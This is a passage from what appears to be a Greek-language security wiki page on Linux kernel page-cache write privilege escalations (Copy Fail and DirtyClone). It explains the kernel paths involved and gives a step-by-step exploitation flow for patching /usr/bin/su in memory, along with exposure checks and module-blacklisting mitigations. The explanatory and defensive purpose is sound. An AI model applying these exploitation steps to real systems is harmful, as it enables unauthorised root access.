Συνήθεις στόχοι υψηλής αξίας:

- **setuid-root** binaries
- Helpers που εκκινούνται από **root services**
- Binaries που εκτελούνται συχνά από **containers που μοιράζονται τον kernel/page cache του host**

#### Παράδειγμα path με AF_ALG + `splice()`

Το Copy Fail (CVE-2026-31431) είναι ένα καλό παράδειγμα αυτής της κατηγορίας. Το ευάλωτο path βρισκόταν στο Linux crypto userspace API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- Το `splice()` μπορεί να μεταφέρει references σε σελίδες του page cache από ένα αναγνώσιμο αρχείο στο crypto TX scatterlist
- Το in-place decrypt path του `algif_aead` επαναχρησιμοποιούσε τα source και destination buffers
- Στη συνέχεια, το `authencesn` έγραφε στην περιοχή του destination tag
- Όταν αυτή η περιοχή εξακολουθούσε να αναφέρεται σε spliced σελίδες που υποστηρίζονταν από αρχεία, η εγγραφή κατέληγε στο **page cache του αρχείου-στόχου**

Επομένως, η ενδιαφέρουσα τεχνική δεν είναι το ίδιο το CVE, αλλά το μοτίβο:

- **τροφοδοτήστε ένα kernel subsystem με σελίδες cache που υποστηρίζονται από αρχεία**
- κάντε το subsystem να **τις θεωρήσει εγγράψιμη έξοδο**
- ενεργοποιήστε μια μικρή, ελεγχόμενη overwrite στη μνήμη

Το δημόσιο PoC χρησιμοποιούσε επαναλαμβανόμενες **εγγραφές 4-byte** για να τροποποιήσει το `/usr/bin/su` στη μνήμη και έπειτα το εκτελούσε.<sup>[[4]](#references)[[7]](#references)</sup>

#### Παράδειγμα path με ESP / XFRM + netfilter TEE clone

Το DirtyClone (CVE-2026-43503) παρουσιάζει μια άλλη παραλλαγή του ίδιου μοτίβου **εγγραφής στο root μόνο μέσω page cache**, αλλά αυτή τη φορά ο προορισμός είναι το **IPsec ESP decrypt** αντί για το `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Η σημαντική τεχνική είναι το **βήμα metadata laundering**:

- Το `splice()` τοποθετεί μια **read-only σελίδα page cache που υποστηρίζεται από αρχείο** σε ένα πακέτο ESP-in-UDP
- Η αρχική mitigation του DirtyFrag πρόσθετε την ετικέτα `SKBFL_SHARED_FRAG` στο skb, ώστε το `esp_input()` να **αντιγράφει πριν από το decrypt**
- Το netfilter `TEE` αντιγράφει το πακέτο μέσω των `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- Το clone διατηρεί το **ίδιο physical page-cache reference**, αλλά χάνει το `SKBFL_SHARED_FRAG`
- Έπειτα, το `esp_input()` θεωρεί το clone ασφαλές και εκτελεί **in-place `cbc(aes)` decrypt** πάνω στη σελίδα που υποστηρίζεται από αρχείο

Το μάθημα για τους reviewers είναι ευρύτερο από το ίδιο το CVE: αν μια mitigation βασίζεται σε **metadata του skb/page** για να αποφασίσει αν πρέπει πρώτα να γίνει αντιγραφή, οποιοδήποτε **path clone/copy που διατηρεί την backing page αλλά απορρίπτει τα metadata** μπορεί να επανενεργοποιήσει σιωπηρά το primitive εγγραφής.

Τυπική ροή exploitation:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` για να αποκτήσετε **`CAP_NET_ADMIN` μέσα σε ένα private network namespace**
2. ενεργοποιήστε το loopback και εγκαταστήστε έναν κανόνα **netfilter `TEE`** στο `mangle/OUTPUT`
3. εγκαταστήστε **XFRM ESP transport SAs** μέσω `NETLINK_XFRM`
4. κωδικοποιήστε κάθε 4-byte word-στόχο στο πεδίο `seq_hi` του SA (το τέχνασμα επιλογής word του DirtyFrag)
5. στείλτε το spliced πακέτο ESP-in-UDP, ώστε το **TEE clone** να φτάσει στο `esp_input()` και να γίνει decrypt **in place**
6. επαναλάβετε μέχρι το αντίγραφο του `/usr/bin/su` στο page cache ή κάποιου άλλου προνομιούχου executable να περιέχει κώδικα που ελέγχει ο attacker

Σε επιχειρησιακό επίπεδο, η επίδραση είναι ίδια με το παράδειγμα `AF_ALG`: το αρχείο στον δίσκο παραμένει καθαρό, αλλά το `execve()` χρησιμοποιεί τα **τροποποιημένα bytes του page cache** και παρέχει root.<sup>[[8]](#references)[[9]](#references)</sup>

Χρήσιμοι έλεγχοι έκθεσης για αυτήν την παραλλαγή:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Η βραχυπρόθεσμη μείωση της επιφάνειας επίθεσης εξαρτάται επίσης από τη διαδρομή: η αναβάθμιση σε kernel που περιλαμβάνει το `48f6a5356a33` διορθώνει τη διαδρομή clone, ενώ η απενεργοποίηση του autoload του `xt_TEE` αφαιρεί το **flag-laundering step** και η απενεργοποίηση των `esp4` / `esp6` αφαιρεί το **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Έκθεση και αναζήτηση

Αν υποψιάζεστε αυτήν την κατηγορία σφάλματος, μην βασίζεστε μόνο στους ελέγχους ακεραιότητας του δίσκου. Επαληθεύστε επίσης:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Οι παρακάτω τιμές διαμόρφωσης διακρίνουν μια διεπαφή που μπορεί να φορτωθεί από μία ενσωματωμένη στον kernel· οι κανόνες build του crypto αντιστοιχίζουν το `CONFIG_CRYPTO_USER_API_AEAD` στο `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: το `algif_aead` μπορεί να φορτωθεί ή να αποφορτωθεί ως module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: η διεπαφή είναι ενσωματωμένη στον kernel
- τα setuid binaries είναι καλοί στόχοι, επειδή ένα patch μόνο στο page cache μπορεί να αρκεί για να μετατρέψει ένα τοπικό foothold σε root

#### Μείωση της επιφάνειας επίθεσης για τη διαδρομή `algif_aead`

Αν η ευάλωτη διεπαφή παρέχεται από ένα module που μπορεί να φορτωθεί:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Αν είναι μεταγλωττισμένο στον kernel, ορισμένες αναφορές αποκάλυψης ευπάθειας περιέγραψαν το μπλοκάρισμα της διαδρομής init με:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Αξίζει να θυμάστε αυτόν τον τύπο μετριασμού και για άλλα kernel LPEs: αν η εκμετάλλευση εξαρτάται από ένα συγκεκριμένο προαιρετικό interface, η απενεργοποίηση ή η προσθήκη του interface σε blacklist μπορεί να διακόψει τη διαδρομή του exploit ακόμη και πριν γίνει διαθέσιμη μια πλήρης αναβάθμιση του kernel.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – παραβίαση script που εκτελείται ως root σε κατάλογο PaperCut με δυνατότητα εγγραφής από χρήστη](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — Συχνές ερωτήσεις](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Γνωστοποίηση του Openwall oss-security για το CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Διόρθωση στο Linux stable: crypto: algif_aead - επαναφορά λειτουργίας out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — γνωστοποίηση για το CVE-2026-31431](https://copy.fail/)
- [7] [Τεχνική ανάλυση των Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Αποθετήριο DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Ανάλυση και εκμετάλλευση της παραλλαγής Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Διόρθωση Linux: net: skb: διατήρηση του `SKBFL_SHARED_FRAG` στο `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Προηγούμενος μετριασμός Linux: ορισμός του `SKBFL_SHARED_FRAG` για πακέτα UDP που έχουν υποστεί splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Σελίδα εγχειριδίου Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Τεκμηρίωση του Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Συσχετίσεις εφαρμογών MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Προδιαγραφή Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Προδιαγραφή Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Γλώσσα Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile του Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Ευπάθεια page cache του Linux kernel AF_ALG](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Τεκμηρίωση του Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Τεκμηρίωση του Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Τεκμηρίωση ρυθμίσεων του Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Τεκμηρίωση generator του systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: μηχανισμοί persistence](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
